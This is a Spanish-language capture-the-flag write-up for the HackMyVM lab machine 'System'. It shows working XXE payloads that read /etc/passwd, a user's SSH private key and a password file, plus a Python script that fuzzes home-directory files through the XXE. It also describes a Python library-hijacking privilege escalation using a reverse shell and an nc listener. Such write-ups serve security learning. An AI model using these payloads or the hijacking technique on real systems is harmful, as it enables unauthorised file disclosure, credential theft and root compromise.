---
layout: post
title: Art
date: 2022-12-03
categories: ["HMV", "XXE", "File Edit"]
thumbnail: "assets/images/System.png"
---

# System [ Hack My VM ]

### Reconocimiento
##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 192.168.1.109 -oG allPorts`
- `nmap -sCV -p22,80 192.168.1.109 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Shell
Si entramos en la página vemos un panel para registrarnos, pero cuando tratamos de registrarnos nos dice que nuestro usuario ya existe. Si miramos el apartado de `Network` en las opciones de `developer` (inspeccionar elemento) veremos que cuando hacemos la petición para registrarnos se utiliza `XML`, por lo que podemos intentar `XML External Entity`.

`XXE` es una vulnerabilidad que inyecta `XML` malicioso en dichos archivos, vamos a ver cómo podemos explotarlo:

```
<?xml version="1.0" encoding="UTF-8"?>
<details>
    <email>black@cage.com</email>
    <password>blackcage</password>
</details>
```

Como vemos esto es el `XML` normal, pero si buscamos por `payloads` nos encontraremos con muchos ejemplos de lo que podemos hacer, en este caso vamos a ver el fichero `/etc/passwd`:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<details>
    <email>&ent;</email>
    <password>blackcage</password>
</details>
```

Como habéis visto hemos añadido dos cosas nuevas, la segunda línea está definiendo una variable con el nombre `ent` que va a almacenar el contenido del archivo `/etc/passwd`. En la cuarta línea vemos que estamos llamando a la variable con `&ent;` para que así cuando nos vaya a decir que el correo ya existe nos muestre el fichero ya mencionado.

Bien! Podemos mirar archivos de la máquina! Como vimos antes con `NMap` el puerto `22` (`SSH`) está abierto, por lo que me voy a dirigir a la carpeta `.ssh` del único usuario que he visto (`david`) para tratar de ver su `id_rsa`.

Para ello cambiaremos la segunda línea del `XML` para que `ent` almacene dicho fichero:

```
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///home/david/.ssh/id_rsa"> ]>
```

Bien! Ya tenemos la `id_rsa` de `David`! Aunque hay un problema, si tratamos de entrar con dicha clave nos pide una contraseña, pero no la tenemos.

No pasa nada, vamos a enumerar su directorio personal en busca de un archivo que contenga su contraseña o algo relevante. Para ello creé un `script` en `Python` ya que `BurpSuite` iba bastante lento.

```
import requests

with open("/usr/share/wordlists/SecLists/Fuzzing/fuzz-Bo0oM.txt", "r") as wordlist:
    lines = wordlist.readlines()

    for line in lines:
        line = line.replace("\n", "")
        headers = {
            "Host": "192.168.1.109",
            "User-Agent": "BlackCage",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "http://192.168.1.109",
            "Connection": "close",
            "Referer": "http://192.168.1.109/"
        }

        data = f'<?xml version="1.0" encoding="UTF-8"?>\r\n<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///home/david/{line}"> ]>\r\n<details><email>&ent;</email><password>black123</password></details>'

        r = requests.post("http://192.168.1.109/magic.php", headers=headers, data=data, verify=False)
        
        if str(len(r.content)) != "85":
            print(f"{line} | {lenght}")
```

Vemos que primero abre el archivo [`fuzz-Bo0oM.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/fuzz-Bo0oM.txt), un diccionario que está presente en el repositorio de [`SecLists`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/fuzz-Bo0oM.txt). Después de eso lee el archivo y lo almacena en una variable llamada `lines`. Con un `for loop` iteramos por cada elemento de `lines`, cada línea estará almacenada en la variable `line`.

Bien, una vez tenemos lo anterior sólo manda la petición a la web con los parámetros adecuados y con `len()` mide el largo del contenido. Si el largo del contenido no es igual a `85` muestra en pantalla la línea utilizada (el fichero que estamos buscando) y el largo de la página.

Olé! Ya sabemos su funcionamiento, vamos a iniciarlo y a ver qué obtenemos:

```
.profile | 892
.ssh/id_rsa | 2687
.ssh/id_rsa.pub | 653
.viminfo | 786
```

Tras unos segundos vemos que varios archivos aparecen, dos de ellos sabemos que no contienen nada (`.ssh/*`) y el archivo `.profile` no contiene información relevante, pero el fichero `.viminfo` tiene una línea muy interesante:

```
# Password file Created:
'0 1 3 /usr/local/etc/mypass.txt
|4,48,1,3,1648909714,"/usr/local/etc/mypass.txt"
```

Vemos un comentario bastante interesante que nos dice que se creó un fichero `Password`. Vemos una ruta: `/usr/local/etc/mypass.txt`, con el `XXE` antes descubierto vamos a ver el contenido:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///usr/local/etc/mypass.txt"> ]>
<details>
    <email>&ent;</email>
    <password>blackcage</password>
</details>
```

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 03 Dec 2022 16:03:51 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 96

<p align='center'>
  <font color=white size='5pt'>
    h4ck3rd4v!d is already registered!
  </font>
</p>
```

Bien! Ya tenemos la contraseña para el usuario `David` (`david:h4ck3rd4v!d`)!

### Subida de privilegios
Una vez nos hayamos conectado por `SSH` a la máquina víctima tenemos que intentar ser `root`, para ello comencé con enumeración básica, aunque no sirvió de mucho.

Con [`PSPY`](https://github.com/DominicBreuker/pspy) me dispuse a ver los procesos que se ejecutaban en tiempo real y, tras unos minutos de espera, me salió un resultado:

```
2022/12/03 12:13:01 CMD: UID=0    PID=12499  | /bin/sh -c /usr/bin/python3.9 /opt/suid.py
```

Vemos que un `script` en `Python` está siendo ejecutado como `root`, vamos a ver el `script`:

```
from os import system
from pathlib import Path

# Reading only first line
try:
    with open('/home/david/cmd.txt', 'r') as f:
        read_only_first_line = f.readline()
    # Write a new file
    with open('/tmp/suid.txt', 'w') as f:
        f.write(f"{read_only_first_line}")
    check = Path('/tmp/suid.txt')
    if check:
        print("File exists")
        try:
            os.system("chmod u+s /bin/bash")
        except NameError:
            print("Done")
    else:
        print("File not exists")
except FileNotFoundError:
    print("File not exists")
```

Vemos que está importando dos librerías: `os` y `pathlib` de las cuales importará `System` y `Path`. Si continuamos leyendo veremos que abre un archivo en `/home/david` con el nombre de `cmd.txt` y lee sólo la primera línea (y la guarda en una variable).

También abre otro archivo en `/tmp/` con el nombre de `suid.txt` y escribe la línea que antes había leído.

Hace una comprobación, y es que si el fichero `suid.txt` existe intentará cambiar los permisos de `/bin/bash`. Si hay un error al cambiar los permisos mostrará `Done`. Si el fichero `suid.txt` no existe mostrará `File not exists`.

Por último, si el fichero `cmd.txt` no existe no hará nada de lo anterior dicho, sólo mostrará `File not exists`.

Si buscamos por `os.py` (`find / -name os.py 2>/dev/null`) y vemos sus permisos veremos que podemos editarlo, por lo que podemos intentar hacer [`Python Library Hijacking`](https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/).

Para ello iremos a [`IronHackers`](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/) y nos copiaremos la Reverse Shell en `Python` (sin `python -c` ni las comillas simples). Una vez hecho lo anterior podemos copiarlo al final del fichero `os.py` para que se inicie automáticamente.

Bien! Ya tenemos todo preparado! Aunque antes nos tenemos que poner en escucha con `NC`, en mi caso utilizaré el puerto `4444`.

- `nc -nlvp 4444`

Enhorabuena! Tras esperar unos minutos conseguimos una Shell como `root`! Qué fácil!